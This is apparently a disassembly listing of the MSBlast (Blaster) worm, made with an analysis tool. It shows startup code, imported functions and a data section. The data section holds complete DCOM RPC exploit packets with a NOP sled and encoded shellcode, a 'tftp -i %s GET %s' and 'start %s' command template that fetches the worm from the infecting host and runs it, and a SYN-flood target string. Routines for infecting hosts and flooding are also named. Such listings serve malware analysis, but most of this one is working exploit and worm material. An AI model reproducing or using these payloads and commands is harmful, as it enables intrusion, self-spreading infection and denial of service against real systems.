.text:00402276                 or      eax, eax
.text:00402278                 jz      short loc_4022A3
.text:0040227A                 mov     edi, eax
.text:0040227C                 inc     edi
.text:0040227D                 jmp     short loc_402280
.text:0040227F ; ---------------------------------------------------------------------------
.text:0040227F 
.text:0040227F loc_40227F:                             ; CODE XREF: sub_402254+2Fvj
.text:0040227F                 inc     edi
.text:00402280 
.text:00402280 loc_402280:                             ; CODE XREF: sub_402254+29^j
.text:00402280                 cmp     byte ptr [edi], 20h
.text:00402283                 jz      short loc_40227F
.text:00402285                 jmp     short loc_4022A3
.text:00402287 ; ---------------------------------------------------------------------------
.text:00402287 
.text:00402287 loc_402287:                             ; CODE XREF: sub_402254+3Evj
.text:00402287                 inc     edi
.text:00402288 
.text:00402288 loc_402288:                             ; CODE XREF: sub_402254+F^j
.text:00402288                 movsx   eax, byte ptr [edi]
.text:0040228B                 or      eax, eax
.text:0040228D                 jz      short loc_402294
.text:0040228F                 cmp     eax, 20h
.text:00402292                 jnz     short loc_402287
.text:00402294 
.text:00402294 loc_402294:                             ; CODE XREF: sub_402254+39^j
.text:00402294                 jmp     short loc_402297
.text:00402296 ; ---------------------------------------------------------------------------
.text:00402296 
.text:00402296 loc_402296:                             ; CODE XREF: sub_402254+4Dvj
.text:00402296                 inc     edi
.text:00402297 
.text:00402297 loc_402297:                             ; CODE XREF: sub_402254+40^j
.text:00402297                 movsx   eax, byte ptr [edi]
.text:0040229A                 or      eax, eax
.text:0040229C                 jz      short loc_4022A3
.text:0040229E                 cmp     eax, 20h
.text:004022A1                 jz      short loc_402296
.text:004022A3 
.text:004022A3 loc_4022A3:                             ; CODE XREF: sub_402254+24^j
.text:004022A3                                         ; sub_402254+31^j ...
.text:004022A3                 push    0               ; lpModuleName
.text:004022A5                 call    GetModuleHandleA
.text:004022AA                 push    1
.text:004022AC                 push    edi
.text:004022AD                 push    0
.text:004022AF                 push    eax
.text:004022B0                 call    WinMain
.text:004022B5                 pop     edi
.text:004022B6                 leave
.text:004022B7                 retn
.text:004022B7 sub_402254      endp
.text:004022B7 
.text:004022B8 
.text:004022B8 ; =============== S U B R O U T I N E =======================================
.text:004022B8 
.text:004022B8 
.text:004022B8 allocstackspace proc near               ; CODE XREF: infectTarget+8^p
.text:004022B8                 pop     ecx
.text:004022B9 
.text:004022B9 loc_4022B9:                             ; CODE XREF: allocstackspace+14vj
.text:004022B9                 sub     esp, 1000h
.text:004022BF                 sub     eax, 1000h
.text:004022C4                 test    [esp], eax
.text:004022C7                 cmp     eax, 1000h
.text:004022CC                 jnb     short loc_4022B9
.text:004022CE                 sub     esp, eax
.text:004022D0                 test    [esp], eax
.text:004022D3                 jmp     ecx
.text:004022D3 allocstackspace endp
.text:004022D3 
.text:004022D3 ; ---------------------------------------------------------------------------
.text:004022D5                 align 4
.text:004022D8 ; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD "+" TO EXPAND]
.text:004022DE                 dd 9090h
.text:004022E2                 align 4
.text:004022E4 ; [00000006 BYTES: COLLAPSED FUNCTION ExitThread. PRESS KEYPAD "+" TO EXPAND]
.text:004022EA                 align 8
.text:004022F0 ; [00000006 BYTES: COLLAPSED FUNCTION GetCommandLineA. PRESS KEYPAD "+" TO EXPAND]
.text:004022F6                 dd 9090h
.text:004022FA                 align 4
.text:004022FC ; [00000006 BYTES: COLLAPSED FUNCTION GetDateFormatA. PRESS KEYPAD "+" TO EXPAND]
.text:00402302                 align 8
.text:00402308 ; [00000006 BYTES: COLLAPSED FUNCTION GetLastError. PRESS KEYPAD "+" TO EXPAND]
.text:0040230E                 dd 9090h
.text:00402312                 align 4
.text:00402314 ; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameA. PRESS KEYPAD "+" TO EXPAND]
.text:0040231A                 align 8
.text:00402320 ; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA. PRESS KEYPAD "+" TO EXPAND]
.text:00402326                 dd 9090h
.text:0040232A                 align 4
.text:0040232C ; [00000006 BYTES: COLLAPSED FUNCTION CloseHandle. PRESS KEYPAD "+" TO EXPAND]
.text:00402332                 align 8
.text:00402338 ; [00000006 BYTES: COLLAPSED FUNCTION GetTickCount. PRESS KEYPAD "+" TO EXPAND]
.text:0040233E                 dd 9090h
.text:00402342                 align 4
.text:00402344 ; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
.text:0040234A                 align 8
.text:00402350 ; [00000006 BYTES: COLLAPSED FUNCTION CreateMutexA. PRESS KEYPAD "+" TO EXPAND]
.text:00402356                 dd 9090h
.text:0040235A                 align 4
.text:0040235C ; [00000006 BYTES: COLLAPSED FUNCTION Sleep. PRESS KEYPAD "+" TO EXPAND]
.text:00402362                 align 8
.text:00402368 ; [00000006 BYTES: COLLAPSED FUNCTION TerminateThread. PRESS KEYPAD "+" TO EXPAND]
.text:0040236E                 dd 9090h
.text:00402372                 align 4
.text:00402374 ; [00000006 BYTES: COLLAPSED FUNCTION CreateThread. PRESS KEYPAD "+" TO EXPAND]
.text:0040237A                 align 8
.text:00402380 ; [00000006 BYTES: COLLAPSED FUNCTION RegCloseKey. PRESS KEYPAD "+" TO EXPAND]
.text:00402386                 dd 9090h
.text:0040238A                 align 4
.text:0040238C ; [00000006 BYTES: COLLAPSED FUNCTION RegCreateKeyExA. PRESS KEYPAD "+" TO EXPAND]
.text:00402392                 align 8
.text:00402398 ; [00000006 BYTES: COLLAPSED FUNCTION RegSetValueExA. PRESS KEYPAD "+" TO EXPAND]
.text:0040239E                 dd 9090h
.text:004023A2                 align 4
.text:004023A4 ; [00000006 BYTES: COLLAPSED FUNCTION __GetMainArgs. PRESS KEYPAD "+" TO EXPAND]
.text:004023AA                 align 8
.text:004023B0 ; [00000006 BYTES: COLLAPSED FUNCTION atoi. PRESS KEYPAD "+" TO EXPAND]
.text:004023B6                 dd 9090h
.text:004023BA                 align 4
.text:004023BC ; [00000006 BYTES: COLLAPSED FUNCTION exit. PRESS KEYPAD "+" TO EXPAND]
.text:004023C2                 align 8
.text:004023C8 ; [00000006 BYTES: COLLAPSED FUNCTION fclose. PRESS KEYPAD "+" TO EXPAND]
.text:004023CE                 dd 9090h
.text:004023D2                 align 4
.text:004023D4 ; [00000006 BYTES: COLLAPSED FUNCTION fopen. PRESS KEYPAD "+" TO EXPAND]
.text:004023DA                 align 8
.text:004023E0 ; [00000006 BYTES: COLLAPSED FUNCTION fread. PRESS KEYPAD "+" TO EXPAND]
.text:004023E6                 dd 9090h
.text:004023EA                 align 4
.text:004023EC ; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS KEYPAD "+" TO EXPAND]
.text:004023F2                 align 8
.text:004023F8 ; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD "+" TO EXPAND]
.text:004023FE                 dd 9090h
.text:00402402                 align 4
.text:00402404 ; [00000006 BYTES: COLLAPSED FUNCTION raise. PRESS KEYPAD "+" TO EXPAND]
.text:0040240A                 align 8
.text:00402410 ; [00000006 BYTES: COLLAPSED FUNCTION rand. PRESS KEYPAD "+" TO EXPAND]
.text:00402416                 dd 9090h
.text:0040241A                 align 4
.text:0040241C ; [00000006 BYTES: COLLAPSED FUNCTION signal. PRESS KEYPAD "+" TO EXPAND]
.text:00402422                 align 8
.text:00402428 ; [00000006 BYTES: COLLAPSED FUNCTION sprintf. PRESS KEYPAD "+" TO EXPAND]
.text:0040242E                 dd 9090h
.text:00402432                 align 4
.text:00402434 ; [00000006 BYTES: COLLAPSED FUNCTION srand. PRESS KEYPAD "+" TO EXPAND]
.text:0040243A                 align 8
.text:00402440 ; [00000006 BYTES: COLLAPSED FUNCTION strchr. PRESS KEYPAD "+" TO EXPAND]
.text:00402446                 dd 9090h
.text:0040244A                 align 4
.text:0040244C ; [00000006 BYTES: COLLAPSED FUNCTION strtok. PRESS KEYPAD "+" TO EXPAND]
.text:00402452                 align 8
.text:00402452 _text           ends
.text:00402452 
.bss:00403000 ; Section 2. (virtual address 00003000)
.bss:00403000 ; Virtual size                  : 0000013C (    316.)
.bss:00403000 ; Section size in file          : 00000000 (      0.)
.bss:00403000 ; Offset to raw data for section: 00000000
.bss:00403000 ; Flags C0000080: Bss Readable Writable
.bss:00403000 ; Alignment     : 16 bytes ?
.bss:00403000 ; ---------------------------------------------------------------------------
.bss:00403000 
.bss:00403000 ; Segment type: Uninitialized
.bss:00403000 ; Segment permissions: Read&#47;Write
.bss:00403000 _bss            segment para public &#39;BSS&#39; use32
.bss:00403000                 assume cs:_bss
.bss:00403000                 ;org 403000h
.bss:00403000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:00403000 ; char cp
.bss:00403000 cp              db 10h dup(?)           ; DATA XREF: infect20Hosts+91^o
.bss:00403000                                         ; infect20Hosts+9E^o ...
.bss:00403010 octet2          dd ?                    ; DATA XREF: WinMain+1C6^w
.bss:00403010                                         ; WinMain+219^r ...
.bss:00403014 synspoofoctet1  dd ?                    ; DATA XREF: WinMain+103^w
.bss:00403014                                         ; WinMain+214^w ...
.bss:00403018                 db    ? ;
.bss:00403019                 db    ? ;
.bss:0040301A                 db    ? ;
.bss:0040301B                 db    ? ;
.bss:0040301C                 db    ? ;
.bss:0040301D                 db    ? ;
.bss:0040301E                 db    ? ;
.bss:0040301F                 db    ? ;
.bss:00403020 ; CHAR Filename
.bss:00403020 Filename        db 104h dup(?)          ; DATA XREF: WinMain+B9^o
.bss:00403020                                         ; TFTPServerThread+BF^o
.bss:00403020                                         ; 260 (104h) = MAX_PATH
.bss:00403124 ; SOCKET s
.bss:00403124 s               dd ?                    ; DATA XREF: TFTPServerThread+21^w
.bss:00403124                                         ; TFTPServerThread+6B^r ...
.bss:00403128 octet1          dd ?                    ; DATA XREF: WinMain+1A9^w
.bss:00403128                                         ; WinMain+20F^r ...
.bss:0040312C octet4          dd ?                    ; DATA XREF: WinMain+E0^w
.bss:0040312C                                         ; incrementOctets^r ...
.bss:00403130 octet3          dd ?                    ; DATA XREF: WinMain+1E6^w
.bss:00403130                                         ; WinMain+209^w ...
.bss:00403134 dwWhichRetAddr  dd ?                    ; DATA XREF: WinMain+246^w
.bss:00403134                                         ; WinMain+262^w ...
.bss:00403138 synspoofoctet2  dd ?                    ; DATA XREF: WinMain+116^w
.bss:00403138                                         ; WinMain+21E^w ...
.bss:00403138 _bss            ends
.bss:00403138 
.data:0040313C ; Section 3. (virtual address 00004000)
.data:0040313C ; Virtual size                  : 0000088C (   2188.)
.data:0040313C ; Section size in file          : 0000088C (   2188.)
.data:0040313C ; Offset to raw data for section: 00001A00
.data:0040313C ; Flags C0000040: Data Readable Writable
.data:0040313C ; Alignment     : 16 bytes ?
.data:0040313C ; ---------------------------------------------------------------------------
.data:0040313C 
.data:0040313C ; Segment type: Pure data
.data:0040313C ; Segment permissions: Read&#47;Write
.data:0040313C _data           segment para public &#39;DATA&#39; use32
.data:0040313C                 assume cs:_data
.data:0040313C                 ;org 40313Ch
.data:0040313C                 align 1000h
.data:00404000                 dd offset cp
.data:00404004                 dd 40313Ch
.data:00404008                 dd 8000h
.data:0040400C                 dd 0
.data:00404010 dword_404010    dd 0                    ; DATA XREF: .text:00401142^w
.data:00404010                                         ; .text:0040115C^w ...
.data:00404014 dword_404014    dd 0                    ; DATA XREF: start+60^w
.data:00404018                 db    0 ;  
.data:00404019                 db    0 ;  
.data:0040401A                 db    0 ;  
.data:0040401B                 db    0 ;  
.data:0040401C unk_40401C      db    0 ;               ; DATA XREF: start+B^o
.data:0040401D                 db    0 ;  
.data:0040401E                 db    0 ;  
.data:0040401F                 db    0 ;  
.data:00404020 dword_404020    dd 0                    ; DATA XREF: start+44^o
.data:00404020                                         ; start+5A^r
.data:00404024 dword_404024    dd 0                    ; DATA XREF: start+3F^o
.data:00404024                                         ; start+54^r
.data:00404028 dword_404028    dd 0                    ; DATA XREF: start+3A^o
.data:00404028                                         ; start+4E^r
.data:0040402C dword_40402C    dd 0                    ; DATA XREF: .text:004011AA^r
.data:0040402C                                         ; .text:004011BA^r
.data:00404030 dword_404030    dd 0                    ; DATA XREF: .text:004010AB^w
.data:00404034 dword_404034    dd 0                    ; DATA XREF: .text:004010B0^w
.data:00404034                                         ; .text:004010C8^w
.data:00404038 dwTFTPInProgress dd 0                   ; DATA XREF: TFTPServerThread+C^w
.data:00404038                                         ; TFTPServerThread+174^w ...
.data:0040403C aMsblast_exe    db &#39;msblast.exe&#39;,0      ; DATA XREF: WinMain+31^o
.data:0040403C                                         ; infectTarget+3BA^o ...
.data:00404048 aIJustWantToSay db &#39;I just want to say LOVE YOU SAN!!&#39;,0
.data:0040406A aBillyGatesWhyD db &#39;billy gates why do you make this possible ? Stop making mone&#39;
.data:0040406A                 db &#39;y and fix your software!!&#39;,0
.data:004040C0 
.data:004040C0 Static exploit packet components (from http:&#47;&#47;www.metasploit.com&#47;tools&#47;dcom.c)
.data:004040C0 
.data:004040C0 bindstr         db    5,   0, 0Bh,   3, 10h,   0,   0,   0, 48h,   0,   0,   0, 7Fh,   0,   0,   0; 0
.data:004040C0                 db 0D0h, 16h,0D0h, 16h,   0,   0,   0,   0,   1,   0,   0,   0,   1,   0,   1,   0; 16
.data:004040C0                 db 0A0h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0,   0,   0,   0, 46h; 32
.data:004040C0                 db    0,   0,   0,   0,   4, 5Dh, 88h, 8Ah,0EBh, 1Ch,0C9h, 11h, 9Fh,0E8h,   8,   0; 48
.data:004040C0                 db  2Bh, 10h, 48h, 60h,   2,   0,   0,   0; 64
.data:00404108 request1        db    5,   0,   0,   3, 10h,   0,   0,   0,0E8h,   3,   0,   0,0E5h,   0,   0,   0; 0
.data:00404108                 db 0D0h,   3,   0,   0,   1,   0,   4,   0,   5,   0,   6,   0,   1,   0,   0,   0; 16
.data:00404108                 db    0,   0,   0,   0, 32h, 24h, 58h,0FDh,0CCh, 45h, 64h, 49h,0B0h, 70h,0DDh,0AEh; 32
.data:00404108                 db  74h, 2Ch, 96h,0D2h, 60h, 5Eh, 0Dh,   0,   1,   0,   0,   0,   0,   0,   0,   0; 48
.data:00404108                 db  70h, 5Eh, 0Dh,   0,   2,   0,   0,   0, 7Ch, 5Eh, 0Dh,   0,   0,   0,   0,   0; 64
.data:00404108                 db  10h,   0,   0,   0, 80h, 96h,0F1h,0F1h, 2Ah, 4Dh,0CEh, 11h,0A6h, 6Ah,   0, 20h; 80
.data:00404108                 db 0AFh, 6Eh, 72h,0F4h, 0Ch,   0,   0,   0, 4Dh, 41h, 52h, 42h,   1,   0,   0,   0; 96
.data:00404108                 db    0,   0,   0,   0, 0Dh,0F0h,0ADh,0BAh,   0,   0,   0,   0,0A8h,0F4h, 0Bh,   0; 112
.data:00404108                 db  60h,   3,   0,   0, 60h,   3,   0,   0, 4Dh, 45h, 4Fh, 57h,   4,   0,   0,   0; 128
.data:00404108                 db 0A2h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0,   0,   0,   0, 46h; 144
.data:00404108                 db  38h,   3,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0,   0,   0,   0, 46h; 160
.data:00404108                 db    0,   0,   0,   0, 30h,   3,   0,   0, 28h,   3,   0,   0,   0,   0,   0,   0; 176
.data:00404108                 db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh,0C8h,   0,   0,   0, 4Dh, 45h, 4Fh, 57h; 192
.data:00404108                 db  28h,   3,   0,   0,0D8h,   0,   0,   0,   0,   0,   0,   0,   2,   0,   0,   0; 208
.data:00404108                 db    7,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 224
.data:00404108                 db    0,   0,   0,   0,0C4h, 28h,0CDh,   0, 64h, 29h,0CDh,   0,   0,   0,   0,   0; 240
.data:00404108                 db    7,   0,   0,   0,0B9h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 256
.data:00404108                 db    0,   0,   0, 46h,0ABh,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 272
.data:00404108                 db    0,   0,   0, 46h,0A5h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 288
.data:00404108                 db    0,   0,   0, 46h,0A6h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 304
.data:00404108                 db    0,   0,   0, 46h,0A4h,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 320
.data:00404108                 db    0,   0,   0, 46h,0ADh,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 336
.data:00404108                 db    0,   0,   0, 46h,0AAh,   1,   0,   0,   0,   0,   0,   0,0C0h,   0,   0,   0; 352
.data:00404108                 db    0,   0,   0, 46h,   7,   0,   0,   0, 60h,   0,   0,   0, 58h,   0,   0,   0; 368
.data:00404108                 db  90h,   0,   0,   0, 40h,   0,   0,   0, 20h,   0,   0,   0, 78h,   0,   0,   0; 384
.data:00404108                 db  30h,   0,   0,   0,   1,   0,   0,   0,   1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh; 400
.data:00404108                 db  50h,   0,   0,   0, 4Fh,0B6h, 88h, 20h,0FFh,0FFh,0FFh,0FFh,   0,   0,   0,   0; 416
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 432
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 448
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 464
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 480
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh; 496
.data:00404108                 db  48h,   0,   0,   0,   7,   0, 66h,   0,   6,   9,   2,   0,   0,   0,   0,   0; 512
.data:00404108                 db 0C0h,   0,   0,   0,   0,   0,   0, 46h, 10h,   0,   0,   0,   0,   0,   0,   0; 528
.data:00404108                 db    0,   0,   0,   0,   1,   0,   0,   0,   0,   0,   0,   0, 78h, 19h, 0Ch,   0; 544
.data:00404108                 db  58h,   0,   0,   0,   5,   0,   6,   0,   1,   0,   0,   0, 70h,0D8h, 98h, 93h; 560
.data:00404108                 db  98h, 4Fh,0D2h, 11h,0A9h, 3Dh,0BEh, 57h,0B2h,   0,   0,   0, 32h,   0, 31h,   0; 576
.data:00404108                 db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh, 80h,   0,   0,   0, 0Dh,0F0h,0ADh,0BAh; 592
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 608
.data:00404108                 db  18h, 43h, 14h,   0,   0,   0,   0,   0, 60h,   0,   0,   0, 60h,   0,   0,   0; 624
.data:00404108                 db  4Dh, 45h, 4Fh, 57h,   4,   0,   0,   0,0C0h,   1,   0,   0,   0,   0,   0,   0; 640
.data:00404108                 db 0C0h,   0,   0,   0,   0,   0,   0, 46h, 3Bh,   3,   0,   0,   0,   0,   0,   0; 656
.data:00404108                 db 0C0h,   0,   0,   0,   0,   0,   0, 46h,   0,   0,   0,   0, 30h,   0,   0,   0; 672
.data:00404108                 db    1,   0,   1,   0, 81h,0C5h, 17h,   3, 80h, 0Eh,0E9h, 4Ah, 99h, 99h,0F1h, 8Ah; 688
.data:00404108                 db  50h, 6Fh, 7Ah, 85h,   2,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 704
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   0,   0,   0; 720
.data:00404108                 db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh, 30h,   0,   0,   0, 78h,   0, 6Eh,   0; 736
.data:00404108                 db    0,   0,   0,   0,0D8h,0DAh, 0Dh,   0,   0,   0,   0,   0,   0,   0,   0,   0; 752
.data:00404108                 db  20h, 2Fh, 0Ch,   0,   0,   0,   0,   0,   0,   0,   0,   0,   3,   0,   0,   0; 768
.data:00404108                 db    0,   0,   0,   0,   3,   0,   0,   0, 46h,   0, 58h,   0,   0,   0,   0,   0; 784
.data:00404108                 db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh, 10h,   0,   0,   0, 30h,   0, 2Eh,   0; 800
.data:00404108                 db    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 816
.data:00404108                 db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh, 68h,   0,   0,   0, 0Eh,   0,0FFh,0FFh; 832
.data:00404108                 db  68h, 8Bh, 0Bh,   0,   2,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0; 848
.data:00404468 request2        db  20h,   0,   0,   0,   0,   0,   0,   0, 20h,   0,   0,   0, 5Ch,   0, 5Ch,   0; 0
.data:00404478 request3:
.data:00404478                 unicode 0, &#60;\C$\123456111111111111111.doc&#62;,0
.data:004044B4 sc:
.data:004044B4                 unicode 0, &#60;FXNBFXFXNBFXFXFXFX&#62;
.data:004044D8                 dd 0FFFFFFFFh
.data:004044DC                 dd 7FFDE0CCh
.data:004044E0                 dd 7FFDE0CCh
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 0
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 16
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 32
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 48
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 64
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 80
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 96
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 112
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 128
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h; 144
.data:004044E4                 db  90h, 90h, 90h, 90h, 90h, 90h, 90h,0EBh, 19h, 5Eh, 31h,0C9h, 81h,0E9h, 89h,0FFh; 160
.data:004044E4                 db 0FFh,0FFh, 81h, 36h, 80h,0BFh, 32h, 94h, 81h,0EEh,0FCh,0FFh,0FFh,0FFh,0E2h,0F2h; 176
.data:004044E4                 db 0EBh,   5,0E8h,0E2h,0FFh,0FFh,0FFh,   3, 53h,   6, 1Fh, 74h, 57h, 75h, 95h, 80h; 192
.data:004044E4                 db 0BFh,0BBh, 92h, 7Fh, 89h, 5Ah, 1Ah,0CEh,0B1h,0DEh, 7Ch,0E1h,0BEh, 32h, 94h,   9; 208
.data:004044E4                 db 0F9h, 3Ah, 6Bh,0B6h,0D7h, 9Fh, 4Dh, 85h, 71h,0DAh,0C6h, 81h,0BFh, 32h, 1Dh,0C6h; 224
.data:004044E4                 db 0B3h, 5Ah,0F8h,0ECh,0BFh, 32h,0FCh,0B3h, 8Dh, 1Ch,0F0h,0E8h,0C8h, 41h,0A6h,0DFh; 240
.data:004044E4                 db 0EBh,0CDh,0C2h, 88h, 36h, 74h, 90h, 7Fh, 89h, 5Ah,0E6h, 7Eh, 0Ch, 24h, 7Ch,0ADh; 256
.data:004044E4                 db 0BEh, 32h, 94h,   9,0F9h, 22h, 6Bh,0B6h,0D7h, 4Ch, 4Ch, 62h,0CCh,0DAh, 8Ah, 81h; 272
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h,0ABh,0CDh,0E2h, 84h,0D7h,0F9h, 79h, 7Ch, 84h,0DAh, 9Ah, 81h; 288
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h,0A7h,0CDh,0E2h, 84h,0D7h,0EBh, 9Dh, 75h, 12h,0DAh, 6Ah, 80h; 304
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h,0A3h,0CDh,0E2h, 84h,0D7h, 96h, 8Eh,0F0h, 78h,0DAh, 7Ah, 80h; 320
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h, 9Fh,0CDh,0E2h, 84h,0D7h, 96h, 39h,0AEh, 56h,0DAh, 4Ah, 80h; 336
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h, 9Bh,0CDh,0E2h, 84h,0D7h,0D7h,0DDh,   6,0F6h,0DAh, 5Ah, 80h; 352
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h, 97h,0CDh,0E2h, 84h,0D7h,0D5h,0EDh, 46h,0C6h,0DAh, 2Ah, 80h; 368
.data:004044E4                 db 0BFh, 32h, 1Dh,0C6h, 93h,   1, 6Bh,   1, 53h,0A2h, 95h, 80h,0BFh, 66h,0FCh, 81h; 384
.data:004044E4                 db 0BEh, 32h, 94h, 7Fh,0E9h, 2Ah,0C4h,0D0h,0EFh, 62h,0D4h,0D0h,0FFh, 62h, 6Bh,0D6h; 400
.data:004044E4                 db 0A3h,0B9h, 4Ch,0D7h,0E8h, 5Ah, 96h, 80h,0AEh, 6Eh, 1Fh, 4Ch,0D5h, 24h,0C5h,0D3h; 416
.data:004044E4                 db  40h, 64h,0B4h,0D7h,0ECh,0CDh,0C2h,0A4h,0E8h, 63h,0C7h, 7Fh,0E9h, 1Ah, 1Fh, 50h; 432
.data:004044E4                 db 0D7h, 57h,0ECh,0E5h,0BFh, 5Ah,0F7h,0EDh,0DBh, 1Ch, 1Dh,0E6h, 8Fh,0B1h, 78h,0D4h; 448
.data:004044E4                 db  32h, 0Eh,0B0h,0B3h, 7Fh,   1, 5Dh,   3, 7Eh, 27h, 3Fh, 62h, 42h,0F4h,0D0h,0A4h; 464
.data:004044E4                 db 0AFh, 76h, 6Ah,0C4h, 9Bh, 0Fh, 1Dh,0D4h, 9Bh, 7Ah, 1Dh,0D4h, 9Bh, 7Eh, 1Dh,0D4h; 480
.data:004044E4                 db  9Bh, 62h, 19h,0C4h, 9Bh, 22h,0C0h,0D0h,0EEh, 63h,0C5h,0EAh,0BEh, 63h,0C5h, 7Fh; 496
.data:004044E4                 db 0C9h,   2,0C5h, 7Fh,0E9h, 22h, 1Fh, 4Ch,0D5h,0CDh, 6Bh,0B1h, 40h, 64h, 98h, 0Bh; 512
.data:004044E4                 db  77h, 65h, 6Bh,0D6h, 93h,0CDh,0C2h, 94h,0EAh, 64h,0F0h, 21h, 8Fh, 32h, 94h, 80h; 528
.data:004044E4                 db  3Ah,0F2h,0ECh, 8Ch, 34h, 72h, 98h, 0Bh,0CFh, 2Eh, 39h, 0Bh,0D7h, 3Ah, 7Fh, 89h; 544
.data:004044E4                 db  34h, 72h,0A0h, 0Bh, 17h, 8Ah, 94h, 80h,0BFh,0B9h, 51h,0DEh,0E2h,0F0h, 90h, 80h; 560
.data:004044E4                 db 0ECh, 67h,0C2h,0D7h, 34h, 5Eh,0B0h, 98h, 34h, 77h,0A8h, 0Bh,0EBh, 37h,0ECh, 83h; 576
.data:004044E4                 db  6Ah,0B9h,0DEh, 98h, 34h, 68h,0B4h, 83h, 62h,0D1h,0A6h,0C9h, 34h,   6, 1Fh, 83h; 592
.data:004044E4                 db  4Ah,   1, 6Bh, 7Ch, 8Ch,0F2h, 38h,0BAh, 7Bh, 46h, 93h, 41h, 70h, 3Fh, 97h, 78h; 608
.data:004044E4                 db  54h,0C0h,0AFh,0FCh, 9Bh, 26h,0E1h, 61h, 34h, 68h,0B0h, 83h, 62h, 54h, 1Fh, 8Ch; 624
.data:004044E4                 db 0F4h,0B9h,0CEh, 9Ch,0BCh,0EFh, 1Fh, 84h, 34h, 31h, 51h, 6Bh,0BDh,   1, 54h, 0Bh; 640
.data:004044E4                 db  6Ah, 6Dh,0CAh,0DDh,0E4h,0F0h, 90h, 80h, 2Fh,0A2h,   4,   0; 656
.data:00404780 request4        db    1, 10h,   8,   0,0CCh,0CCh,0CCh,0CCh, 20h,   0,   0,   0, 30h,   0, 2Dh,   0; 0
.data:00404780                 db    0,   0,   0,   0, 88h, 2Ah, 0Ch,   0,   2,   0,   0,   0,   1,   0,   0,   0; 16
.data:00404780                 db  28h, 8Ch, 0Ch,   0,   1,   0,   0,   0,   7,   0,   0,   0,   0,   0,   0,   0; 32
.data:004047B0 g_zerobuf60     db 3Ch dup(0)
.data:004047EC aWindowsupdate_ db &#39;windowsupdate.com&#39;,0 ; DATA XREF: WUSYNFloodThread+E^o
.data:004047FE aS_0            db &#39;%s&#39;,0Ah,0           ; DATA XREF: infectTarget+47F^o
.data:00404802 aStartS         db &#39;start %s&#39;,0Ah,0     ; DATA XREF: infectTarget+432^o
.data:0040480C aTftpISGetS     db &#39;tftp -i %s GET %s&#39;,0Ah,0 ; DATA XREF: infectTarget+3C4^o
.data:0040481F aD_D_D_D        db &#39;%d.%d.%d.%d&#39;,0      ; DATA XREF: infectTarget+36E^o
